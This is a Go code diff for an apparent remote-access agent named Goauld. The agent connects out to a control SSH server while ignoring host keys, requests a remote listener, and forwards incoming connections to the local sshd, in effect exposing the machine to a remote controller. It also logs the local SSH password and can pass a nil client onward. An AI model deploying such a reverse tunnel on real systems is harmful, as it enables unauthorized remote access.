@@ -2,6 +2,8 @@ package ssh
 
 import (
 	"Goauld/agent/agent"
+	"Goauld/agent/ssh/transport"
+	"Goauld/common/log"
 	"fmt"
 	"golang.org/x/crypto/ssh"
 	"io"
@@ -19,11 +21,9 @@ func connect() error {
 		Auth:            []ssh.AuthMethod{ssh.PublicKeys(privateKey)},
 		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
 	}
-	client, err := ssh.Dial("tcp", agent.Get().ControlSshServer(), sshConfig)
 
-	if err != nil {
-		return fmt.Errorf("failed to dial SSH server: %w", err)
-	}
+	client := initClient(sshConfig)
+
 	defer client.Close()
 
 	remoteListener, err := client.Listen("tcp", agent.Get().RemoteForwardedSshdAddress())
@@ -32,27 +32,28 @@ func connect() error {
 	}
 
 	remotePort := remoteListener.Addr().(*net.TCPAddr).Port
-	fmt.Printf("remote port is %d\n", remotePort)
-	fmt.Printf("LocalSshPassword is %s\n", agent.Get().LocalSShdPassword())
+	log.Info().Msgf("Remote port: %d", remotePort)
+	log.Info().Msg("LocalSshPassword is:")
+	log.Trace().Msg(agent.Get().LocalSShdPassword())
 	defer remoteListener.Close()
 
 	for {
 		remoteConn, err := remoteListener.Accept()
 		if err != nil {
 			// TODO faire du throttle si on garde l'erreur, voir pour cuoper proprement après un temp ?
-			fmt.Printf("failed to accept remote connection: %v", err)
+			log.Error().Err(err).Msg("failed to accept remote connection")
 			continue
 		}
 
 		go func() {
-			defer remoteListener.Accept()
 
 			localConn, err := net.Dial("tcp", agent.Get().LocalSShdAddress())
 			if err != nil {
-				fmt.Printf("failed to connect to locla service: %v", err)
+				log.Error().Err(err).Msg("failed to connect to local service")
 				return
 			}
 			defer localConn.Close()
+			//TODO: gérer proprement les Copy?
 			go io.Copy(localConn, remoteConn)
 			io.Copy(remoteConn, localConn)
 		}()
@@ -60,6 +61,17 @@ func connect() error {
 	}
 	return nil
 }
+
+func initClient(sshConfig *ssh.ClientConfig) *ssh.Client {
+	client, err := transport.DirectSshConnect(sshConfig)
+	if err == nil {
+		return client
+	}
+	log.Error().Err(err).Msg("failed to direct connect to remote ssh service")
+	// TODO handle other connections (tlssh, wssh, sshttp, etc...)
+	return nil
+}
+
 func Connect() {
 	go connect()
 }
